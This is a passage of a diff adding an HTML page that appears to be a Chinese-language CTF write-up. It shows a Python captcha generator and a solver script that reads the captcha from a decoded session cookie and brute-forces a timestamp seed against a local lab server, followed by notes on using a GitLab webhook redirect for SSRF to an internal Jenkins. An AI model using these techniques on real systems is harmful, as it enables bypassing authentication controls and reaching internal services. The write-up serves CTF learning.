+</span></span><span style="display:flex;"><span>        background <span style="color:#f92672">=</span> random_color(<span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">255</span>)
+</span></span><span style="display:flex;"><span>        color <span style="color:#f92672">=</span> random_color(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">200</span>, random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">255</span>))
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>create_captcha_image(chars, color, background)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>create_noise_dots(im, color)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>create_noise_curve(im, color)
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>filter(SMOOTH)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> im
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate</span>(self, format: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;png&#39;</span>,code: str<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#f92672">-&gt;</span> (BytesIO,str):
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span>  code
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>generate_image(code)
+</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> BytesIO()
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>save(out, format<span style="color:#f92672">=</span>format)
+</span></span><span style="display:flex;"><span>        out<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> out, code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(self, output: str, format: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;png&#39;</span>) <span style="color:#f92672">-&gt;</span> (Image, str):
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> generate_code(self<span style="color:#f92672">.</span>_length)
+</span></span><span style="display:flex;"><span>        im <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>generate_image(code)
+</span></span><span style="display:flex;"><span>        im<span style="color:#f92672">.</span>save(output, format<span style="color:#f92672">=</span>format)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> im, code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:15000/captcha&#34;</span>
+</span></span><span style="display:flex;"><span>burp0_headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0&#34;</span>, <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#34;</span>, <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate, br&#34;</span>, <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;Sec-Fetch-Dest&#34;</span>: <span style="color:#e6db74">&#34;document&#34;</span>, <span style="color:#e6db74">&#34;Sec-Fetch-Mode&#34;</span>: <span style="color:#e6db74">&#34;navigate&#34;</span>, <span style="color:#e6db74">&#34;Sec-Fetch-Site&#34;</span>: <span style="color:#e6db74">&#34;none&#34;</span>, <span style="color:#e6db74">&#34;Sec-Fetch-User&#34;</span>: <span style="color:#e6db74">&#34;?1&#34;</span>}
+</span></span><span style="display:flex;"><span>rsp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers)
+</span></span><span style="display:flex;"><span>timestamp <span style="color:#f92672">=</span> int(time<span style="color:#f92672">.</span>time())
+</span></span><span style="display:flex;"><span>session_cookie <span style="color:#f92672">=</span> rsp<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;session&#39;</span>)
+</span></span><span style="display:flex;"><span>decoded_payload <span style="color:#f92672">=</span> decode(session_cookie)
+</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> decoded_payload<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;captcha&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> timestamp <span style="color:#f92672">+</span> i
+</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> generate_code()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> code <span style="color:#f92672">==</span> cap:
+</span></span><span style="display:flex;"><span>        print(key)
+</span></span><span style="display:flex;"><span>        gen <span style="color:#f92672">=</span> Captcha(<span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">80</span>,key<span style="color:#f92672">=</span>key)
+</span></span><span style="display:flex;"><span>        buf, captcha_text <span style="color:#f92672">=</span> gen<span style="color:#f92672">.</span>generate(code<span style="color:#f92672">=</span>code)
+</span></span><span style="display:flex;"><span>        captcha <span style="color:#f92672">=</span> generate_code()
+</span></span><span style="display:flex;"><span>        print(captcha)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><h2 id="hooks">hooks</h2>
+<p>整个题目架构就是用Nginx去反代一个程序，然后内网还有个jenkins</p>
+<p>使用<code>gitlab</code>的<code>webhook</code>经过302重定向可以发送<code>get</code>请求，访问<code>nginx</code>会回显一个重定向参数，然后将其重定向到内网的<code>jenkins</code>，发现其版本为<code>2.138</code>，存在历史漏洞，但是我咋都打不通，且<code>nginx</code>代理的程序存在<code>waf</code>，后面在看</p>
+
+        </article>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+</footer>
+</body>
+</html>
